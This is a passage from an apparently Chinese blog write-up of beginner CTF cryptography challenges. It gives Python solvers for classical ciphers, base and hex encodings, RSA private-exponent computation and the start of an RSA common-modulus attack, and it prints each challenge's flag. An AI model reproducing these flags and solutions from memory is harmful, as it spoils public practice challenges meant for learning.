class="keyword">if</span> char.isupper():</span><br><span class="line">                    <span class="comment"># 大写字母解密</span></span><br><span class="line">                    decrypted_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">'A'</span>) - shift) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">'A'</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># 小写字母解密</span></span><br><span class="line">                    decrypted_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">'a'</span>) - shift) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">'a'</span>))</span><br><span class="line">                decrypted += decrypted_char</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 非字母字符直接保留</span></span><br><span class="line">                decrypted += char</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"Shift <span class="subst">{shift}</span>: <span class="subst">{decrypted}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文</span></span><br><span class="line">ciphertext = <span class="string">"AFFPGS{pbatenghyngvbaf!!!}"</span></span><br><span class="line">caesar_brute_force(ciphertext)</span><br></pre></td></tr></tbody></table></figure><p>得到：</p><blockquote><p>NSSCTF{congratulations!!!}</p></blockquote><hr><h2 id="08-SWPUCTF-2021-新生赛-pigpig"><a href="#08-SWPUCTF-2021-新生赛-pigpig" class="headerlink" title="08 [SWPUCTF 2021 新生赛]pigpig"></a>08 [SWPUCTF 2021 新生赛]pigpig</h2><p>🚩flag：<code>NSSCTF{congratulations!!!}</code></p><p>💡hint：<code>古典密码</code> <code>其他</code> <code>猪圈密码</code></p><p>之前练习misc见过的，猪圈密码。</p><p>解密网站：<a href="http://www.hiencode.com/pigpen.html">http://www.hiencode.com/pigpen.html</a></p><p>![截屏2025-08-12 13.27.12](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-12 13.27.12.png)</p><blockquote><p>NSSCTF{whenthepigwanttoeat}</p></blockquote><hr><h2 id="09-SWPUCTF-2021-新生赛-ez-rsa"><a href="#09-SWPUCTF-2021-新生赛-ez-rsa" class="headerlink" title="09 [SWPUCTF 2021 新生赛]ez_rsa"></a>09 [SWPUCTF 2021 新生赛]ez_rsa</h2><p>🚩flag：<code>NSSCTF{08bb8fb628da85923e5734a75ac19ffe}</code></p><p>💡hint：<code>RSA</code></p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">p = <span class="number">1325465431</span></span><br><span class="line">q = <span class="number">152317153</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">计算出d,将d用MD5加密后包裹NSSCTF{}提交</span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的参数</span></span><br><span class="line">p = <span class="number">1325465431</span></span><br><span class="line">q = <span class="number">152317153</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 n 和 φ(n)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 d (e 的模反元素)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, x, y = extended_gcd(b, a % b)</span><br><span class="line">        <span class="keyword">return</span> g, y, x - (a // b) * y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 d</span></span><br><span class="line">g, x, y = extended_gcd(e, phi_n)</span><br><span class="line"><span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"e 和 φ(n) 不互质，无法计算 d"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    d = x % phi_n  <span class="comment"># 确保 d 是正数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 d 的 MD5 哈希</span></span><br><span class="line">d_str = <span class="built_in">str</span>(d)</span><br><span class="line">md5_hash = hashlib.md5(d_str.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 包裹成 flag</span></span><br><span class="line">flag = <span class="string">f"NSSCTF{{<span class="subst">{md5_hash}</span>}}"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"计算得到的 d:"</span>, d)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"MD5 哈希:"</span>, md5_hash)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Flag:"</span>, flag)</span><br></pre></td></tr></tbody></table></figure><p>运行结果：</p><blockquote><p>计算得到的 d: 43476042047970113<br>MD5 哈希: 08bb8fb628da85923e5734a75ac19ffe<br>Flag: NSSCTF{08bb8fb628da85923e5734a75ac19ffe}</p></blockquote><hr><h2 id="10-LitCTF-2023-梦想是红色的-初级"><a href="#10-LitCTF-2023-梦想是红色的-初级" class="headerlink" title="10 [LitCTF 2023]梦想是红色的 (初级)"></a>10 [LitCTF 2023]梦想是红色的 (初级)</h2><p>🚩flag：<code>NSSCTF{为之则易,不为则难}</code></p><p>💡hint：<code>RSA</code></p><p>题目描述: 曾经我有个梦想。</p><blockquote><p>自由友善公正公正敬业法治自由自由和谐平等自由自由公正法治诚信民主诚信自由自由诚信民主爱国友善平等诚信富强友善爱国自由诚信民主敬业爱国诚信民主友善爱国平等爱国爱国敬业敬业友善爱国公正敬业爱国敬业和谐文明诚信文明友善爱国自由诚信民主爱国爱国诚信和谐友善爱国自由友善平等爱国友善平等友善自由诚信自由平等爱国爱国敬业敬业友善爱国敬业敬业友善自由友善平等诚信自由法治诚信和谐</p></blockquote><p>核心价值观解密，很红。</p><p>使用脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    str1 = <span class="built_in">input</span>(<span class="string">'输入要解码的文本：'</span>)</span><br><span class="line">    list1 = [<span class="string">'富强'</span>, <span class="string">'民主'</span>, <span class="string">'文明'</span>, <span class="string">'和谐'</span>, <span class="string">'自由'</span>, <span class="string">'平等'</span>, <span class="string">'公正'</span>, <span class="string">'法治'</span>, <span class="string">'爱国'</span>, <span class="string">'敬业'</span>, <span class="string">'诚信'</span>, <span class="string">'友善'</span>]</span><br><span class="line">    list1 = [list1.index(str1[f1 &lt;&lt; <span class="number">1</span>] + str1[f1 &lt;&lt; <span class="number">1</span> | <span class="number">1</span>]) <span class="keyword">for</span> f1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(str1)/<span class="number">2</span>))]</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    list2 = []</span><br><span class="line">    <span class="keyword">while</span> a &lt; <span class="built_in">len</span>(list1):</span><br><span class="line">        <span class="keyword">if</span> list1[a] &lt; <span class="number">10</span>:</span><br><span class="line">            list2.append(<span class="built_in">str</span>(list1[a]))</span><br><span class="line">        <span class="keyword">elif</span> list1[a] == <span class="number">10</span>:</span><br><span class="line">            a += <span class="number">1</span></span><br><span class="line">            list2.append(<span class="built_in">hex</span>(list1[a]+<span class="number">10</span>)[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a += <span class="number">1</span></span><br><span class="line">            list2.append(<span class="built_in">hex</span>(list1[a]+<span class="number">6</span>)[<span class="number">2</span>:])</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">    str1 = <span class="built_in">bytes</span>.fromhex(<span class="string">''</span>.join(list2)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'解码结果：'</span>, str1, <span class="string">'\n'</span>*<span class="number">3</span>)</span><br></pre></td></tr></tbody></table></figure><p>运行结果：</p><blockquote><p>LitCTF{为之则易,不为则难}</p></blockquote><p>记得改成NSSCTF{}</p><hr><h2 id="11-鹤城杯-2021-A-CRYPTO"><a href="#11-鹤城杯-2021-A-CRYPTO" class="headerlink" title="11 [鹤城杯 2021]A_CRYPTO"></a>11 [鹤城杯 2021]A_CRYPTO</h2><p>🚩flag：<code>NSSCTF{W0w_y0u_c4n_rea11y_enc0d1ng!}</code></p><p>💡hint：<code>ROT</code> <code>base</code></p><p>4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar13_decode</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">"""凯撒13解密（ROT13）"""</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'A'</span> &lt;= char &lt;= <span class="string">'Z'</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">'A'</span>) + <span class="number">13</span>) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">'A'</span>)))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'0'</span> &lt;= char &lt;= <span class="string">'9'</span>:</span><br><span class="line">            result.append(char)  <span class="comment"># 数字不处理</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(char)  <span class="comment"># 其他字符保留</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_layers</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    <span class="string">"""多层解码：ROT13 → Base16 → Base32 → Base64 → Base85"""</span></span><br><span class="line">    <span class="comment"># Step 1: ROT13</span></span><br><span class="line">    step1 = caesar13_decode(ciphertext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"After ROT13: <span class="subst">{step1}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 2: Base16</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        step2 = base64.b16decode(step1.encode()).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"After Base16: <span class="subst">{step2}</span>"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        step2 = step1</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Base16 decode failed, skipping..."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 3: Base32</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        step3 = base64.b32decode(step2.encode()).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"After Base32: <span class="subst">{step3}</span>"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        step3 = step2</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Base32 decode failed, skipping..."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 4: Base64</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        step4 = base64.b64decode(step3.encode()).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"After Base64: <span class="subst">{step4}</span>"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        step4 = step3</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Base64 decode failed, skipping..."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 5: Base85</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        step5 = base64.b85decode(step4.encode()).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"After Base85: <span class="subst">{step5}</span>"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        step5 = step4</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Base85 decode failed, skipping..."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> step5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试密文</span></span><br><span class="line">ciphertext = <span class="string">"4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行解密</span></span><br><span class="line">final_result = decode_layers(ciphertext)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"\nFinal Result:"</span>, final_result)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>flag{W0w_y0u_c4n_rea11y_enc0d1ng!}</p></blockquote><hr><h2 id="12-LitCTF-2023-Hex？Hex！-初级"><a href="#12-LitCTF-2023-Hex？Hex！-初级" class="headerlink" title="12 [LitCTF 2023]Hex？Hex！(初级)"></a>12 [LitCTF 2023]Hex？Hex！(初级)</h2><p>🚩flag：<code>NSSCTF{tai111coollaaa!}</code></p><p>💡hint：<code>hex</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">hex_string = <span class="string">"4c69744354467b746169313131636f6f6c6c616161217d"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法1：使用 bytes.fromhex() 和 decode()</span></span><br><span class="line">decoded_str = <span class="built_in">bytes</span>.fromhex(hex_string).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"方法1结果:"</span>, decoded_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2：使用 codecs 模块</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">decoded_str = codecs.decode(hex_string, <span class="string">'hex'</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"方法2结果:"</span>, decoded_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法3：手动转换（适用于学习原理）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_str</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(hex_str[i:i+<span class="number">2</span>], <span class="number">16</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"方法3结果:"</span>, hex_to_str(hex_string))</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="13-BJDCTF-2020-base"><a href="#13-BJDCTF-2020-base" class="headerlink" title="13 [BJDCTF 2020]base??"></a>13 [BJDCTF 2020]base??</h2><p>🚩flag：<code>NSSCTF{D0_Y0u_kNoW_Th1s_b4se_map}</code></p><p>💡hint：<code>base</code></p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">dict:{<span class="number">0</span>: <span class="comment">'J', 1: 'K', 2: 'L', 3: 'M', 4: 'N', 5: 'O', 6: 'x', 7: 'y', 8: 'U', 9: 'V', 10: 'z', 11: 'A', 12: 'B', 13: 'C', 14: 'D', 15: 'E', 16: 'F', 17: 'G', 18: 'H', 19: '7', 20: '8', 21: '9', 22: 'P', 23: 'Q', 24: 'I', 25: 'a', 26: 'b', 27: 'c', 28: 'd', 29: 'e', 30: 'f', 31: 'g', 32: 'h', 33: 'i', 34: 'j', 35: 'k', 36: 'l', 37: 'm', 38: 'W', 39: 'X', 40: 'Y', 41: 'Z', 42: '0', 43: '1', 44: '2', 45: '3', 46: '4', 47: '5', 48: '6', 49: 'R', 50: 'S', 51: 'T', 52: 'n', 53: 'o', 54: 'p', 55: 'q', 56: 'r', 57: 's', 58: 't', 59: 'u', 60: 'v', 61: 'w', 62: '+', 63: '/', 64: '='}</span></span><br><span class="line"></span><br><span class="line">chipertext:</span><br><span class="line">FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw</span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 给定的字典映射</span></span><br><span class="line">mapping = {</span><br><span class="line">    <span class="number">0</span>: <span class="string">'J'</span>, <span class="number">1</span>: <span class="string">'K'</span>, <span class="number">2</span>: <span class="string">'L'</span>, <span class="number">3</span>: <span class="string">'M'</span>, <span class="number">4</span>: <span class="string">'N'</span>, <span class="number">5</span>: <span class="string">'O'</span>, <span class="number">6</span>: <span class="string">'x'</span>, <span class="number">7</span>: <span class="string">'y'</span>, <span class="number">8</span>: <span class="string">'U'</span>, <span class="number">9</span>: <span class="string">'V'</span>,</span><br><span class="line">    <span class="number">10</span>: <span class="string">'z'</span>, <span class="number">11</span>: <span class="string">'A'</span>, <span class="number">12</span>: <span class="string">'B'</span>, <span class="number">13</span>: <span class="string">'C'</span>, <span class="number">14</span>: <span class="string">'D'</span>, <span class="number">15</span>: <span class="string">'E'</span>, <span class="number">16</span>: <span class="string">'F'</span>, <span class="number">17</span>: <span class="string">'G'</span>, <span class="number">18</span>: <span class="string">'H'</span>,</span><br><span class="line">    <span class="number">19</span>: <span class="string">'7'</span>, <span class="number">20</span>: <span class="string">'8'</span>, <span class="number">21</span>: <span class="string">'9'</span>, <span class="number">22</span>: <span class="string">'P'</span>, <span class="number">23</span>: <span class="string">'Q'</span>, <span class="number">24</span>: <span class="string">'I'</span>, <span class="number">25</span>: <span class="string">'a'</span>, <span class="number">26</span>: <span class="string">'b'</span>, <span class="number">27</span>: <span class="string">'c'</span>,</span><br><span class="line">    <span class="number">28</span>: <span class="string">'d'</span>, <span class="number">29</span>: <span class="string">'e'</span>, <span class="number">30</span>: <span class="string">'f'</span>, <span class="number">31</span>: <span class="string">'g'</span>, <span class="number">32</span>: <span class="string">'h'</span>, <span class="number">33</span>: <span class="string">'i'</span>, <span class="number">34</span>: <span class="string">'j'</span>, <span class="number">35</span>: <span class="string">'k'</span>, <span class="number">36</span>: <span class="string">'l'</span>,</span><br><span class="line">    <span class="number">37</span>: <span class="string">'m'</span>, <span class="number">38</span>: <span class="string">'W'</span>, <span class="number">39</span>: <span class="string">'X'</span>, <span class="number">40</span>: <span class="string">'Y'</span>, <span class="number">41</span>: <span class="string">'Z'</span>, <span class="number">42</span>: <span class="string">'0'</span>, <span class="number">43</span>: <span class="string">'1'</span>, <span class="number">44</span>: <span class="string">'2'</span>, <span class="number">45</span>: <span class="string">'3'</span>,</span><br><span class="line">    <span class="number">46</span>: <span class="string">'4'</span>, <span class="number">47</span>: <span class="string">'5'</span>, <span class="number">48</span>: <span class="string">'6'</span>, <span class="number">49</span>: <span class="string">'R'</span>, <span class="number">50</span>: <span class="string">'S'</span>, <span class="number">51</span>: <span class="string">'T'</span>, <span class="number">52</span>: <span class="string">'n'</span>, <span class="number">53</span>: <span class="string">'o'</span>, <span class="number">54</span>: <span class="string">'p'</span>,</span><br><span class="line">    <span class="number">55</span>: <span class="string">'q'</span>, <span class="number">56</span>: <span class="string">'r'</span>, <span class="number">57</span>: <span class="string">'s'</span>, <span class="number">58</span>: <span class="string">'t'</span>, <span class="number">59</span>: <span class="string">'u'</span>, <span class="number">60</span>: <span class="string">'v'</span>, <span class="number">61</span>: <span class="string">'w'</span>, <span class="number">62</span>: <span class="string">'+'</span>, <span class="number">63</span>: <span class="string">'/'</span>,</span><br><span class="line">    <span class="number">64</span>: <span class="string">'='</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文</span></span><br><span class="line">ciphertext = <span class="string">"FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤1：创建反向映射字典（字符 → 数字）</span></span><br><span class="line">reverse_mapping = {v: k <span class="keyword">for</span> k, v <span class="keyword">in</span> mapping.items()}</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤2：将密文字符转换为对应的数字</span></span><br><span class="line">numbers = []</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">    <span class="keyword">if</span> char <span class="keyword">in</span> reverse_mapping:</span><br><span class="line">        numbers.append(reverse_mapping[char])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"警告：字符 '<span class="subst">{char}</span>' 不在映射字典中！"</span>)</span><br><span class="line">        numbers.append(<span class="number">0</span>)  <span class="comment"># 默认用0代替（可根据需要修改）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"转换后的数字序列:"</span>, numbers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤3：将数字转换为Base64索引（0-63）</span></span><br><span class="line"><span class="comment"># 观察字典，发现索引64对应'='，所以需要模64处理</span></span><br><span class="line">base64_indices = [num % <span class="number">64</span> <span class="keyword">for</span> num <span class="keyword">in</span> numbers]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Base64索引序列:"</span>, base64_indices)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤4：将Base64索引转换为标准Base64字符</span></span><br><span class="line">base64_chars = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line">base64_str = <span class="string">''</span>.join([base64_chars[idx] <span class="keyword">for</span> idx <span class="keyword">in</span> base64_indices])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Base64字符串:"</span>, base64_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤5：解码Base64</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">decoded_bytes = base64.b64decode(base64_str)</span><br><span class="line">decoded_text = decoded_bytes.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"最终解密结果:"</span>, decoded_text)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>BJD{D0_Y0u_kNoW_Th1s_b4se_map}</p></blockquote><hr><h2 id="14-SWPUCTF-2021-新生赛-traditional"><a href="#14-SWPUCTF-2021-新生赛-traditional" class="headerlink" title="14 [SWPUCTF 2021 新生赛]traditional"></a>14 [SWPUCTF 2021 新生赛]traditional</h2><p>🚩flag：<code>NSSCTF{Da01sall}</code></p><p>💡hint：<code>其他</code></p><p>题目：<br>西方的二进制数学的发明者莱布尼茨，从中国的八卦图当中受到启发，演绎并推论出了数学矩<br>阵，<br>最后创造的二进制数学。二进制数学的诞生为计算机的发明奠定了理论基础。而计算机现在改<br>变<br>了我们整个世界，改变了我们生活，而他的源头却是来自于八卦图。现在，给你一组由八卦图<br>方位<br>组成的密文，你能破解出其中的含义吗？<br>震坤艮 震艮震 坤巽坤 坤巽震 震巽兑 震艮震 震离艮 震离艮<br>格式：NSSCTF{}</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">_<span class="built_in">hash</span> = {<span class="string">"乾"</span>:<span class="string">"111"</span> , <span class="string">"兑"</span>:<span class="string">"011"</span> , <span class="string">"离"</span>:<span class="string">"101"</span> , <span class="string">"震"</span>:<span class="string">"001"</span> , <span class="string">"巽"</span>:<span class="string">"110"</span> , <span class="string">"坎"</span>:<span class="string">"010"</span> , <span class="string">"艮"</span>:<span class="string">"100"</span> , <span class="string">"坤"</span>:<span class="string">"000"</span>}</span><br><span class="line">text = <span class="string">"震坤艮 震艮震 坤巽坤 坤巽震 震巽兑 震艮震 震离艮 震离艮"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag += <span class="string">''</span>.join(_<span class="built_in">hash</span>[i])</span><br><span class="line">    <span class="keyword">except</span> KeyError:</span><br><span class="line">        flag += <span class="string">''</span>.join(<span class="string">" "</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"flag = "</span> , flag)</span><br><span class="line">_flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span> , <span class="built_in">len</span>(flag) , <span class="number">10</span>):</span><br><span class="line">    _flag += <span class="string">''</span>.join((<span class="built_in">chr</span>((<span class="built_in">int</span>(flag[j:j + <span class="number">10</span>] , <span class="number">2</span>)))))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"NSSCTF{"</span> + _flag + <span class="string">"}"</span>)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>NSSCTF{Da01sall}</p></blockquote><hr><h2 id="15-SWPUCTF-2021-新生赛-crypto2"><a href="#15-SWPUCTF-2021-新生赛-crypto2" class="headerlink" title="15 [SWPUCTF 2021 新生赛]crypto2"></a>15 [SWPUCTF 2021 新生赛]crypto2</h2><p>🚩flag：<code>NSSCTF{xxxxx******xxxxx}</code></p><p>💡hint：<code>RSA</code> <code>共模攻击</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag  = <span class="string">'***************'</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e1 = getPrime(<span class="number">32</span>)</span><br><span class="line">e2 = getPrime(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e1,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'flag1= '</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'flag2= '</span>+<span class="built_in">str</span>(flag2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'e1= '</span> +<span class="built_in">str</span>(e1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'e2= '</span>+<span class="built_in">str</span>(e2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n= '</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag1= 100156221476910922393504870369139942732039899485715044553913743347065883159136513788649486841774544271396690778274591792200052614669235485675534653358596366535073802301361391007325520975043321423979924560272762579823233787671688669418622502663507796640233829689484044539829008058686075845762979657345727814280</span></span><br><span class="line"><span class="comment">#flag2= 86203582128388484129915298832227259690596162850520078142152482846864345432564143608324463705492416009896246993950991615005717737886323630334871790740288140033046061512799892371429864110237909925611745163785768204802056985016447086450491884472899152778839120484475953828199840871689380584162839244393022471075</span></span><br><span class="line"><span class="comment">#e1= 3247473589</span></span><br><span class="line"><span class="comment">#e2= 3698409173</span></span><br><span class="line"><span class="comment">#n= 103606706829811720151309965777670519601112877713318435398103278099344725459597221064867089950867125892545997503531556048610968847926307322033117328614701432100084574953706259773711412853364463950703468142791390129671097834871371125741564434710151190962389213898270025272913761067078391308880995594218009110313</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>RSA 共模攻击</p><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext, invert, powmod</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定数据</span></span><br><span class="line">flag1 = <span class="number">100156221476910922393504870369139942732039899485715044553913743347065883159136513788649486841774544271396690778274591792200052614669235485675534653358596366535073802301361391007325520975043321423979924560272762579823233787671688669418622502663507796640233829689484044539829008058686075845762979657345727814280</span></span><br><span class="line">flag2 = <span class="number">86203582128388484129915298832227259690596162850520078142152482846864345432564143608324463705492416009896246993950991615005717737886323630334871790740288140033046061512799892371429864110237909925611745163785768204802056985016447086450491884472899152778839120484475953828199840871689380584162839244393022471075</span></span><br><span class="line">e1 = <span class="number">3247473589</span></span><br><span class="line">e2 = <span class="number">3698409173</span></span><br><span class="line">n = <span class="number">103606706829811720151309965777670519601112877713318435398103278099344725459597221064867089950867125892545997503531556048610968847926307322033117328614701432100084574953706259773711412853364463950703468142791390129671097834871371125741564434710151190962389213898270025272913761067078391308880995594218009110313</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤1：计算扩展欧几里得系数</span></span><br><span class="line">g, s, t = gcdext(e1, e2)</span><br><span class="line"><span class="keyword">assert</span> g == <span class="number">1</span>  <span class="comment"># 确保e1和e2互质</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤2：调整系数确保非负</span></span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    flag1 = invert(flag1, n)</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span 